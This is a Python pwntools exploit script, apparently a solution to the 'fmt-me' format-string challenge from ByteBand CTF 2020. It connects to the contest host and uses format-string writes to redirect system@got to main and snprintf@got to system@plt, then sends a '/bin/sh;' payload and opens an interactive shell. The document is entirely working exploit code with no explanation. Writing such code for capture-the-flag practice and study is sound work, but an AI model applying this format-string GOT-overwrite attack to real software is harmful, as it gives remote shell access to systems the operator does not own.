#!/usr/bin/python
from pwn import *

chdir = '/MOUNT/contest/bytebandctf-2020/fmt-me/'
config = {
        'elf': chdir + 'fmt',
        'HOST': 'pwn.byteband.it',
        'PORT': 6969,
        }

context.log_level='debug'
e = ELF(config["elf"])
#r = process(e.path, env={'LD_PRELOAD':config["libc"]})
r = remote(config["HOST"], config["PORT"])

def fsb(data):
	r.sendlineafter('Choice:','2')
	r.sendafter("Good job. I'll give you a gift.\n",data)

# 1. system@got --> main()
fsb("%{}x%8$nAAA{}".format(e.symbols['main'], p64(e.got['system'])))
pause()

# 2. snprintf@got --> system@plt + 6
fsb("/bin/sh;%{}x%9$lnAA{}".format(e.plt['system']+6-8, p64(e.got['snprintf'])))
pause()

# 3. trigger
fsb("dummy")
r.interactive()

